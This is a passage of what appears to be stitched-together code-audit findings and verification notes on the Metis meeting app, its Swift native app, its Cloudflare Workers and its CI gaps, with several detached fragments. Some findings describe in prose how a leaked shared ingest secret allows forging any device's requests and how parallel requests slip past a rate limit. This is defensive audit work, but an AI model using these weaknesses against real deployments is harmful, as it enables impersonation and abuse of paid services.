Conclusion: the code pattern is real, but it only becomes a problem with much larger libraries or much longer meetings than Tony's. It is not a plausible cause of Tony's History freeze or the "heavy on the PC" report. The freeze cause should be looked for in the main process and sidecars (orphaned llama-server processes, the startup ingest burst, the local LLM cold start). Severity drops from P1 to P3.

Side observation, not part of this finding: .brain holds 180 index.corrupt-*.json files, which is worth passing to the brain/ingest review lane.

- BrainView deals at line 1328.

` - L3706: `if (signInRequired && auth.status && DEMO == null) return signInGate(auth.status)`. signInGate (L3683-3705) renders only , or Settings when view==='settings'. - L3709 onwards: `if (onboardingBoot && DEMO == null)` returns only OnboardingV2 (L3756) inside `.onboard-exclusive-lock`. verification.corrected_mechanism_or_fix:
Corrected mechanism: the gates are rendered by early returns in App.tsx (L3667, L3706, L3709). They replace the whole tree rather than covering it, so they behave as a full page and do not need to be modal. No focus can leak into background content and no focus trap is needed.

1. Render each gate's title as a real heading (<h1>) in SignInWall.tsx L134 and LicenseGate.tsx L109. The gate root can optionally be wrapped in <main> or given aria-labelledby pointing at that heading.
2. Add role="alert" (or aria-live="polite") to the error containers at SignInWall.tsx L171 and LicenseGate.tsx L168.
3. On mount, move initial focus to the first actionable control: the Sign in with Microsoft button in SignInWall, and the server-URL input in LicenseGate (or the key input when the URL is prefilled). Use autoFocus or a ref plus focus() in useEffect.

Do not add role="dialog", aria-modal or a Tab trap. Onboarding already has an h1 and alert regions; at most it could manage focus on step changes, which is a separate low-priority item.

findings.title: TranscriptLine.speaker enum already drifted between TS ('you') and the Swift mirror ('me') with no decode mapping
findings.evidence: OBSERVED: ipc.ts:392 declares speaker: z.enum(['them','you','unknown']); MeetingModels.swift:12 declares `enum Speaker: String, Codable, Sendable { case me, them, unknown }` with a comment claiming it mirrors the Electron app's field for cross-product transcript portability. No interchange path is wired yet in this checkout, so this is latent, not active, but it is exactly the gap TASK-005's golden-fixture + Swift-mirror requirement exists to catch.

verification.evidence:
Checked read-only at 2bf21f1c.

What is true:
- src/shared/ipc.ts:392: TranscriptLineSchema declares `speaker: z.enum(['them', 'you', 'unknown'])`.
- native-app/MetisKit/Sources/MetisKit/MeetingModels.swift:12: declares `enum Speaker: String, Codable, Sendable { case me, them, unknown }`. It relies on synthesized Codable, and nothing anywhere in native-app/ maps "you" to "me".
- So the speaker names really do differ between the two products.

What is wrong:
1. The mechanism is wrong. The speaker drift is not the first thing that would fail, and it is not the only one. The Swift struct (MeetingModels.swift:11-22) requires `id: UUID` and `at: Date`. The TS schema has no `id` and uses `t: number`, which is epoch milliseconds (listen.ts:1088 `t: Date.now()`). Swift's default JSONDecoder reads a Date as a Double counted in seconds since 2001-01-01. So decoding an Electron line into Swift would fail with keyNotFound("id") on EVERY line, including 'them' and 'unknown' lines, before the speaker value is ever read. It would not fail with dataCorrupted on only the 'you' lines. Renaming the enum case alone would fix nothing.
2. The comment is misattributed. The portability comment ("mirrors the Electron app's additive `name` field so transcripts port across both products", lines 15-16) sits on the `name` field, not on the Speaker enum.
3. Nothing reaches this code today. Swift TranscriptLine is only encoded and decoded Swift-to-Swift, in the SwiftData blob at native-app/App/Store/PersistedModels.swift:36 (decode) and :47 (encode). The only Electron-side code that mentions native-app is scripts/build-native-mac.mjs, a build packager. The native README describes sync only between native apps (CloudKit, later). Nothing in src/ imports or exports native transcripts. Tony runs the Electron app (/Applications/Metis.app 1.9.6), which never touches this code, so it has nothing to do with E1-E9 or either bug report (heaviness, History freeze).
4. TASK-005 appears nowhere in the repo, so I could not check the claim that the golden-fixture requirement covers this.

A latent contract-hygiene gap with no reachable path is P3, not P1.
verification.corrected_mechanism_or_fix:
Corrected mechanism: this is a latent mismatch between the two products' data shapes, not a speaker-enum bug. Swift TranscriptLine {id: UUID, speaker: me|them|unknown, name?, text, at: Date (seconds since 2001 by default)} has a different shape from TS TranscriptLine {speaker: them|you|unknown, text, t: epoch-ms, name?, lang?, provisional?}. Any future import from Electron to native would fail on every line, first on the missing `id` key and then on `at`/`t`. The 'you'/'me' difference is one of at least three incompatibilities, and no path between the products exists today.

Warning on the proposed fix: do NOT just rename the Swift case `me` to `you`. PersistedModels.swift:36 decodes with `(try? JSONDecoder().decode([TranscriptLine].self, from: linesData)) ?? []`. After a rename, every native meeting already saved with "me" would fail to decode, and its transcript would silently show as empty in History.

Correct fix, only if and when cross-product interchange is actually built:
- Define an explicit interchange DTO, for example `ElectronTranscriptLineDTO`, that matches the zod schema: speaker them|you|unknown, t as epoch ms, no id.
- Map it to and from the domain model: 'you' <-> .me, t <-> Date(timeIntervalSince1970: t/1000), and a generated UUID.
- Keep the Swift domain enum and the SwiftData blob format unchanged, or add a tolerant init(from:) that accepts both "me" and "you".
- Add one golden JSON fixture, checked by both the zod parse test and a Swift XCTest decode of the DTO.

Until an interchange path exists, a comment fix is enough: MeetingModels.swift:15-16 should not claim the transcripts "port across both products".

findings.failure_scenario: A regression in seat-cap enforcement, the offline Ed25519 lease signature check, the admin bearer-token brute-force lockout, or the X-Forwarded-For anti-spoof guard would only be caught if a human remembers to `cd license-server && npm test` by hand before a deploy -- nothing in CI runs it, so a broken license/seat-cap server (revenue-critical, deployed independently per its own README) could ship and pass every automated gate.

What holds:

Relevance to Tony's reports: none. This finding has no bearing on "heavy on the PC" or "History freezes/crashes". It is a CI-hygiene item for a component that is currently switched off.

findings.title: Legacy no-license HMAC path authenticates "knows the shared ingest secret", not "is device X" -- no per-device binding
findings.evidence: OBSERVED: device-auth.ts:48-51 routes to verifyIngestHmac (hmac.ts:42-77) whenever the license header is absent; that function verifies an HMAC over (ts,nonce,deviceId,bodyHash) against one Worker-wide secret (env.OPERATOR_INGEST_SECRET), with deviceId only shape-validated (DEVICE_ID_RE) not cryptographically bound to the caller -- any holder of that one secret can present any deviceId and be accepted as that device for /v1/ingest, /v1/heartbeat, /v1/use and /v1/ask. DERIVED (read for context only, out of this lane's file scope): src/shared/operator.ts:34-45 shows the client only falls back to this shared-secret path via a raw process.env value with no reference found in electron-builder.yml's resource/env injection, so real packaged end-user installs are unlikely to have it set -- exploitability is bounded to whoever holds OPERATOR_INGEST_SECRET (dev/CI/build environments, or a future secret-handling compromise), not any ordinary user.
findings.failure_scenario: Anyone who obtains the Wrangler-secret OPERATOR_INGEST_SECRET (a build/CI leak, an insider, a future misconfiguration) can, for any device that has not yet been assigned a per-device Operator license, forge requests as ANY other deviceId in the fleet -- reading/writing that device's ingest data and spending its Operator-funded LLM budget -- with zero additional per-device check on the Worker side.
findings.fix_direction: Retire the legacy no-license path once real licenses are universally required (comments already suggest this is the intended end-state), or bind it to something device-specific: require a device's first-ever report under this path to register, and reject a different deviceId's claim to write over an already-registered seat row without the same originating binding.

findings.title: hitRate is a non-atomic read-then-write, not a compare-and-swap -- rate limits under-count under concurrency
findings.evidence: OBSERVED: hitRate (d1.ts:279-296) does a plain SELECT of window_start/count, then an unconditional UPDATE using a value computed from that SELECT, with no WHERE count=? guard and no D1 transaction wrapping the pair. Two concurrent requests from the same device (or admin, via index.ts:247-252's identical use of this primitive for admin-mutation rate limiting) both read the same cur.count and both write the same next=cur.count+1 -- the second increment is lost.
findings.failure_scenario: A burst of N simultaneous requests to /v1/ask, /v1/use, /v1/heartbeat, or a rapid admin-console mutation sequence can land as fewer than N counted hits, so the configured caps in index.ts's RATE_LIMITS (e.g. ask/use 120/min) are softer in practice than they read -- a client (or attacker) sending requests in parallel rather than serially can exceed the intended limit.
findings.fix_direction: Make the increment atomic: `UPDATE rate_limits SET count = count + 1 WHERE device_id = ? AND window_start = ?` with D1's RETURNING to read the new count back in one statement, or an INSERT ... ON CONFLICT DO UPDATE SET count = count + 1 keyed on a rounded window boundary, removing the separate read entirely.

findings.title: Every authenticated request pays an extra, unconditional D1 write to prune the nonce table
findings.evidence: OBSERVED: takeNonce (d1.ts:270-277) runs the correct atomic INSERT...ON CONFLICT DO NOTHING replay guard, but then unconditionally runs `DELETE FROM nonces WHERE ts < ?` after every single non-replayed request -- on the hottest paths in the Worker (/v1/ask, /v1/use, which already do a provider round-trip), doubling D1 write volume purely for table hygiene that does not need to run on every single call to be correct.
findings.failure_scenario: At real fleet scale (hundreds of seats heartbeating/asking continuously) this adds a second D1 write to every authenticated request purely for housekeeping, increasing D1 write cost and per-request latency with no functional benefit over a periodic sweep.
findings.fix_direction: Move the sweep into the existing daily retention cron (retention.ts, already runs via index.ts's scheduled handler and already owns mcp_calls/integration_grants pruning) instead of the request's own critical path, or gate it behind a cheap probabilistic check so the amortized cost stays low.

findings.title: cloudflare-proxy's /v1/chat/completions forwards the request body upstream with no size cap
findings.evidence: OBSERVED: `upstream = await fetch(upstreamUrl, {method:'POST', headers:upstreamHeaders, body: await request.text()})` (index.ts:392-398) has no Content-Length or streamed byte-count check before forwarding. DERIVED (comparison): the sibling proxy in operator/src/use.ts#readUseBody enforces a 6MB REQUEST_BODY_CAP_BYTES cap via Content-Length plus a running byte count while streaming, before JSON parsing or any provider call -- this file has no analogous cap despite forwarding to the same Cloudflare AI endpoint on the operator's own paid account credential.
findings.failure_scenario: A caller holding a valid METIS_PROXY_KEY (or one that leaked) can send an arbitrarily large request body; it is buffered in full and forwarded to api.cloudflare.com billed to the operator's account, bounded only by the Workers platform's own request-size ceiling rather than an application-level limit this Worker chose.
findings.fix_direction: Check Content-Length (and/or stream-count bytes) before calling fetch, mirroring operator/src/use.ts#readUseBody's cap, and return 413 the same way.

refactor_opportunities.title: Extract the shared 'provider not allowed for Operator-funded call' guard from ask.ts and use.ts into one function
refactor_opportunities.rationale: handleAsk (ask.ts:528-531) and handleUse (use.ts:396-399) both independently re-implement the identical `if (!def || def.kind === 'cli' || def.kind === 'dust' || def.kind === 'local') return fail('provider not allowed', 400)` check against PROVIDERS. It is currently correct in both places, but any future provider-kind addition has two call sites to update in lockstep with no compiler or test tying them together.
refactor_opportunities.target_structure: A single exported `assertProviderAllowedForOperatorCall(providerId): ProviderDef | Response-shaped-error` in use.ts (already the shared home for parseUseBody), called from both ask.ts and use.ts.

refactor_opportunities.title: Give operator/src/d1.ts's rate-limit and nonce primitives their own small module
refactor_opportunities.rationale: hitRate and takeNonce are two of the highest-traffic, most security-relevant functions in the codebase (F3/F4 above both live here) but sit inside a 1010-line file mixing them with unrelated CRUD for seats/asks/sessions/groups/tiers. Isolating them makes the atomicity fix in F4 easier to test in isolation and easier for a future reviewer to find without reading the whole store implementation.
refactor_opportunities.target_structure: operator/src/rate-limit.ts and operator/src/replay-guard.ts (or one combined operator/src/abuse-controls.ts), each exporting the D1-backed primitive plus its own focused test file, imported by d1.ts's OperatorStore implementation.

test_gaps: No test exercises GET /v1/integrations end-to-end followed by an actual POST to the delivered `endpoint` value and asserting a non-404 response -- this is exactly the gap that let F1 (dead /v1/mcp/:id route) ship undetected; a single contract test asserting 'every endpoint this Worker tells a seat to call is itself routable' would have caught it.

No test asserts license-server/ actually runs in CI (e.g. a workflow-file assertion test, mirroring the pattern operator/'s client-bundle.contract.test.ts uses to keep a different kind of drift from shipping silently).
No concurrency/race test for d1.ts's hitRate (F4) -- e.g. two simulated parallel calls against the same device_id within one window, asserting the resulting count reflects both.

No test measuring/asserting D1 write-count-per-request for the hot ingest/ask/use paths, which would have made the unconditional nonce-table DELETE (F5) visible as a cost regression rather than something only found by manual code reading.
cloudflare-proxy/src/index.test.ts (not read in full for this pass beyond confirming it exists) should be checked for a request-body-size test; if absent, F6 has no regression-test guard once fixed.

summary: This lane (intelligence/ dashboard, native-app/ Swift, native/mac-helper, resources/, skills/) is the best-engineered code I've seen in the audit set: careful comments, no Swift force-unwraps, a genuinely secure Electron<->dashboard IPC boundary, and 100% test coverage in intelligence/src/lib/. The real problems are structural rather than sloppy-code: (1) the 'Swift/native CI blocker' is confirmed and precisely characterized -- native/mac-helper/main.swift IS compiled+arch-checked in the macOS CI job, but MetisKit's 26 tests never run in any CI job despite native-app/README.md explicitly claiming Linux/CI coverage, and native-app/App (the SwiftUI shell) is never even built by CI; (2) intelligence/'s own views/ and components/ directories break the codebase's otherwise-strict lib/-gets-tested discipline, embedding real untested business logic (deal-risk classification, going-cold fade rules, ROI merging) in 941-to-545-line view files; (3) the 'Update Intelligence' feature is duplicated with already-diverged behavior between intelligence/ and the Electron renderer, with no shared package; (4) GraphView's live physics re-stabilization has no iteration/time cap and is unverified at scale (plausible but unconfirmed secondary contributor to the 'heavy on the PC' report); (5) the unshipped native SwiftUI app has two silent try?-swallowed-error spots that reproduce the exact silent-failure shape behind Tony's existing bug reports, worth fixing before it ships. None of this lane's findings are the proven root cause of Tony's two reported bugs -- those trace mainly to src/main/llm/ and process lifecycle in src/main/index.ts, outside this lane's scope.
architecture_notes: intelligence/ is a fully separate Vite+React+TS npm workspace (own package.json, own node_modules) built by `npm run build:intelligence` and embedded into the packaged Electron app via electron-builder.yml's extraResources (intelligence/dist -> Resources/intelligence). It's loaded in a dedicated, sandboxed BrowserWindow (src/main/intelligence.ts) with a deliberately tiny 4-call preload (src/preload/intelligence.ts), Private View mirrored, all navigation denied, and a document-URL double-check (isIntelligenceSender) before any IPC handler trusts the sender -- this security design has no findings against it. native-app/ is an entirely separate, not-yet-shipped product (per its own README: 'roadmap steps 1-4', 'not an Electron conversion') built around MetisKit (a platform-neutral Swift package: MeetingController/Intelligence/Onboarding/MeetingIntents/SpeechTranscription, 824 LOC, 26 tests) plus a thin SwiftUI App/ shell (1291 LOC) built via xcodegen+xcodebuild. native/mac-helper/main.swift is the one piece of Swift that ships today, a single 309-line dependency-free sidecar compiled per-arch and lipo-merged by scripts/build-mac-helper.mjs, consumed defensively (degrade-to-null on any failure, zod-validated JSON) by src/main/mac-helper.ts. resources/ in this checkout is manifest-only (0 bytes on disk locally); actual model/ASR binaries are fetched at build time against sha256 pins in runtime-assets-manifest.json, matching runtime evidence E1's much larger installed sizes. Cross-cutting concern: intelligence/ and src/renderer/ (the Electron overlay) have no shared package for UI logic that both need -- confirmed by diffing IntelligenceUpdateButton.tsx and intelligence-update.ts between the two trees, which are the same feature with already-diverged implementations.

findings.title: MetisKit's 26 tests never run in any CI job despite README's explicit CI claim
findings.evidence: native-app/README.md:3-4 states MetisKit 'builds and tests on Linux/CI too (Swift 6.0.3)'. grep -n "MetisKit|swift test|swift build|xcodegen|XcodeGen" across all four .github/workflows/*.yml files (build.yml, release.yml, cahe-windows.yml, windows-signing-identity-preflight.yml) returns zero matches. grep -c "func test" across native-app/MetisKit/Tests/MetisKitTests/*.swift confirms the 26-test count itself is accurate (someone ran `swift test` locally), but nothing in this repo's automation re-runs it.
findings.failure_scenario: A future change to MeetingController.swift, Intelligence.swift, MeetingIntents.swift or Onboarding.swift (the entire logic core the native app depends on) breaks one or more of the 26 tests, merges to main, and nobody -- including a release-readiness reviewer trusting the README's CI claim -- is ever told.
findings.fix_direction: Add a dedicated job to .github/workflows/build.yml that runs `swift test` inside native-app/MetisKit (try ubuntu-latest first per the README's own Linux/CI claim; fall back to macos-latest if any Apple-only API leaks past the #if canImport guards). Correct or remove the README's CI claim until the job exists.

verification.evidence:
The mechanism is right: no CI job runs the MetisKit tests. The severity is overstated, and the README line is more a statement of capability than a claim that a CI job exists.

What I read at origin/main 2bf21f1c:
- native-app/README.md:3-4 says MetisKit "builds and tests on Linux/CI too (Swift 6.0.3)". Line 12 of the same file then says "this Linux box only builds/tests the MetisKit package". So the text describes what can run on Linux or CI, not a job that already exists. A reader could still fairly assume a job exists.
- docs/PLATFORM-MAP.md:44-45 makes the same claim ("runs on Linux/CI too, since Apple-only frameworks are canImport-guarded"). The finding does not mention this second place.
- Test count: awk over native-app/MetisKit/Tests/MetisKitTests/*.swift finds 26 `func test` (9 in MetisKitTests, 15 in OnboardingModelTests, 2 in PersistenceCodableTests). The count is accurate. A leftover native-app/MetisKit/.build/ shows someone ran the tests locally.
- CI: awk for swift|MetisKit|native-app|xcodegen across all four .github/workflows/*.yml finds zero matches.
  - The build.yml jobs (quality, operator, security, build-macos, build-windows) only run npm scripts.
  - None of the scripts they call mention Swift: test, typecheck, check:bugs, build, dist and dist:win in package.json. No script in package.json matches swift, native-app or MetisKit.
- scripts/build-native-mac.mjs (the build:native-mac and package:native-mac:local scripts) builds a local QA ZIP. It does not run `swift test`, and no workflow calls it.
- scripts/check-audit.mjs:31 says openly that Package.swift "needs a Swift toolchain (macOS)" and falls outside the audit.

Why P2 and not P1:
- Root README.md:53 calls the SwiftUI native app a "local-only prototype", not distributed until it has its own signing and notarization pipeline.
- scripts/build-native-mac.mjs:3-8 says it is "NOT the Electron DMG and is not a public release artifact".
- The shipped product (Metis.app 1.9.6, com.mantu.asktoto) is Electron. The failure scenario cannot reach any customer build, and it has no link to Tony's two bugs (heavy CPU use, History freeze/crash) or to E1-E9.
- It is a real testability gap and a misleading doc claim for a native-app work stream that is still in progress. That is P2.

Not verified: I could not run `swift test` myself. The session sandbox blocked SwiftPM's sandbox-exec and its build-service writes, and a retry was denied. So whether the 26 tests pass at HEAD, and whether the package really compiles on Linux, are both unproven here.
verification.corrected_mechanism_or_fix:
Corrected mechanism: MetisKit's 26 XCTest cases run only when a developer runs `swift test` by hand. No CI job runs them, and no npm script that CI calls runs them. Two docs describe CI support as if it already existed: native-app/README.md:3-4 and docs/PLATFORM-MAP.md:44-45. A regression in MetisKit can therefore merge to main green. The impact is limited to the native app, which is still a local-only prototype and not a shipped product. P2, not P1.

Fix:
1. Add a `metiskit` job to .github/workflows/build.yml that runs `swift test` with working-directory native-app/MetisKit.
   - Run it on macos-latest with Xcode 26 or later selected (setup-xcode or xcode-select). The canImport(FoundationModels), AppIntents and Speech branches in Intelligence.swift, MeetingModels.swift, MeetingIntents.swift and SpeechTranscription.swift only compile against that SDK.
   - A Linux job (swift:6.0 container) is optional and cheaper. It would only check the platform-neutral half, and it only proves the docs' Linux claim if it actually passes.
2. Until the job exists, change both docs to say "can run on Linux; not yet wired into CI", or remove the CI wording.
3. Update the scripts/check-audit.mjs:31 note once a macOS job is in place.

findings.title: native-app/App (SwiftUI shell) is never built by CI, and even manual builds never run tests
findings.evidence: scripts/build-native-mac.mjs:121-148 is the only script capable of building native-app/App (xcodegen generate + xcodebuild ... build). It is reachable only via package.json's `build:native-mac` and `package:native-mac:local` scripts; grep for both strings across .github/workflows/*.yml returns zero matches. Line 145 passes 'build' as the xcodebuild action, never 'test', so even a manual invocation doesn't exercise the shell's own code paths.
findings.failure_scenario: native-app/App/ (1291 LOC, 0 test files: ContentView.swift, AudioCapture.swift, Store/PersistedModels.swift, Permissions/PermissionsService.swift, etc.) can accumulate compile errors or regressions indefinitely with no automated signal, since nothing ever attempts to build it outside a developer's own manual run.
findings.fix_direction: Add a non-release-blocking CI job (separate from build-macos/dist, per that job's own documented cost-gate reasoning) that runs `xcodegen generate && xcodebuild -project Metis.xcodeproj -scheme Metis -destination 'generic/platform=macOS' build` on macos-latest, gated to push-to-main/PR the same way build-macos already is.

verification.evidence:
The core claim holds. I checked it at HEAD 2bf21f1c.
- scripts/build-native-mac.mjs:99 is `export function buildNativeMac`. Lines 121 and 128-148 run `xcodegen generate` and then `xcodebuild -project Metis.xcodeproj -scheme Metis -configuration Release -destination generic/platform=macOS ... build`. Line 145 is the literal `'build'` action.
- The script is reached only from package.json:48 `build:native-mac` and package.json:49 `package:native-mac:local`.
- `grep -niE "swift|xcode|native" .github/workflows/*.yml` returns zero matches across build.yml, release.yml, cahe-windows.yml and windows-signing-identity-preflight.yml. No workflow ever runs xcodegen, xcodebuild, `swift build` or `swift test`.
- The only CI-adjacent coverage is scripts/build-native-mac.test.ts. It is a vitest unit test of `syncNativeMarketingVersion` (the regex version bump) and never compiles Swift.
- native-app/App is 1291 LOC of Swift (`wc -l`) and has 0 test files. project.yml defines a single `application` target with no test target.

Where the finding is off:
(1) Severity is overstated. The script header (lines 6-7), project.yml comments and native-app/README.md:123 all say this is a local-only QA zip. It is "NOT the Electron DMG and is not a public release artifact", and the planned distribution is a separate App Store submission (docs/PLATFORM-MAP.md:76). The installed product (Metis.app 1.9.6, com.mantu.asktoto) is the Electron app, so this gap reaches no users and has nothing to do with Tony's heavy-CPU or History-freeze reports.
(2) The "line 145 uses build, never test" sub-claim points at the wrong thing. The App target has no test target, so switching to `xcodebuild test` would exercise nothing. The suite that actually exists and goes unrun is MetisKit's 26 Swift tests (native-app/MetisKit/Tests/MetisKitTests: MetisKitTests.swift, OnboardingModelTests.swift, PersistenceCodableTests.swift).
(3) The finding misses a documentation-truth problem. native-app/README.md:3-4, :56, :107 and :110, plus docs/PLATFORM-MAP.md:44-45, say MetisKit "builds and tests on Linux/CI". No workflow does this, so the docs overstate CI coverage. scripts/check-audit.mjs:31 also notes that Package.swift needs a Swift toolchain and was not covered by the dependency scan.

Line 99 is the function header rather than the exact defect line, but the cited range 121-148 is accurate.
verification.corrected_mechanism_or_fix:
Corrected mechanism: no GitHub workflow compiles or tests any Swift code.
- The SwiftUI shell (native-app/App) is built only by a manual run of scripts/build-native-mac.mjs.
- The shell has no test target, so it has no tests for `xcodebuild test` to run.
- MetisKit's 26 `swift test` cases never run in CI, although README.md and PLATFORM-MAP.md say they do.

Impact is limited to a roadmap product that does not ship (a local QA zip); no shipped users are affected. That makes this P2 CI-hygiene and doc-truth work, not P1.

Fix:
(a) Add a cheap job that does not block releases: `cd native-app/MetisKit && swift build && swift test`. It can run on ubuntu-latest with a Swift 6.0.x toolchain, since the README says Apple-only frameworks are canImport-guarded, or on macos-latest. This covers the logic layer that has real tests.
(b) In the same macOS job, compile-check the shell: `cd native-app && xcodegen generate && xcodebuild -project Metis.xcodeproj -scheme Metis -destination 'generic/platform=macOS' CODE_SIGNING_ALLOWED=NO build`. Gate it to PR and push-to-main like build-macos, and keep it separate from the release/dist lane.
(c) Until (a) lands, correct README.md and PLATFORM-MAP.md so they stop saying "Linux/CI".

summary: Métis @ 2bf21f1c (v1.9.6) build/CI/quality audit. CI is unusually well-documented (every gate has a dated rationale comment) and has real strengths: a working bug-ledger anti-regression gate, a well-designed monotonic type-error ratchet, sound cost-gating for expensive packaging jobs, and a working generated-code-drift check for the Operator Worker. But several quality gates that look real on paper are not actually protecting the codebase: the skip-baseline anti-regression gate (check:skips) is never invoked anywhere in CI and its own baseline is already stale versus the project's own clean-machine baseline receipt; docs/**.md (60+ files) is invisible to both secret-scanning mechanisms; and 36+ "contract" tests exist purely because src/main/index.ts (9,518 lines) has no testable seams, so they assert on source text via readFileSync+regex instead of exercising behavior — a single architecture root cause, not 36 independent test-quality mistakes. Also found: zero lint/format tooling anywhere, inconsistent GitHub Actions supply-chain pinning (10 of 11 actions/checkout uses are an unpinned mutable tag, including in the signed customer-release pipeline), giant 22-27-command chained npm release scripts, and a hardcoded /tmp path in the global Electron test mock. Ran the three allowed commands (typecheck exit 0, check-skipped-tests.mjs exit 1, test-file count) and did the extra work to separate genuine repo defects from this session's own sandboxed-audit-environment artifacts (documented explicitly in the report) rather than mischaracterizing sandbox noise as product bugs.
architecture_notes: CI topology (verified from .github/workflows/*.yml on:/if: blocks, not inferred): build.yml triggers on push to ALL branches (tags-ignore v*/ffmpeg-sidecar-*) + pull_request to main/master + workflow_dispatch — so every branch push runs `quality` (ubuntu+windows matrix: typecheck, check:bugs, build, npm test), `operator` (rebuild+diff generated bundles, typecheck, test), and `security` (npm audit critical + high-with-carveout, narrow secret grep, gitleaks digest-pinned, SBOM best-effort). Full macOS/Windows installer packaging (build-macos/build-windows, 90min each) only runs on workflow_dispatch, pull_request, or push to main/master — a deliberate, well-justified cost gate (comment cites a real prior Actions-budget exhaustion incident). release.yml triggers only on `v*` tag push, re-verifies tag==origin/main and tag==package.json version before signing. Root vitest.config.ts intentionally scopes include to src/**, intelligence/src/**, scripts/**, eval/** only; operator/ and cloudflare-proxy/ each have their own vitest config chained into `npm test` via test:operator/test:proxy — this split is deliberately documented and verified accurate (not a defect). The one significant architecture-level defect: src/main/index.ts is a 9,518-line Electron bootstrap file that "boots Electron at import" with (per the tests' own comments) "no injectable seams," forcing 36+ contract tests to pin behavior via raw source-text pattern matching rather than import-and-call. This is the actual root cause behind the "contract tests that grep source" pattern the audit brief asked about, and fixing it means extracting index.ts's IPC-handler/routing logic into importable modules, not touching the 36 tests individually.

findings.title: check:skips anti-regression gate is never run in CI and its own baseline is already stale
findings.evidence: grep for check:skips/check-skipped across .github/workflows/*.yml returns zero matches (package.json:80 defines the script; scripts/check-skipped-tests.mjs:79 hardcodes BASELINE={win32:12,darwin:1,linux:18}). The project's own clean-machine baseline receipt (metis-2.0-exec/receipts/BASELINE-EXITS.txt, macOS host, same commit) reports skipped:25 for the desktop suite, already far above the darwin baseline of 1.
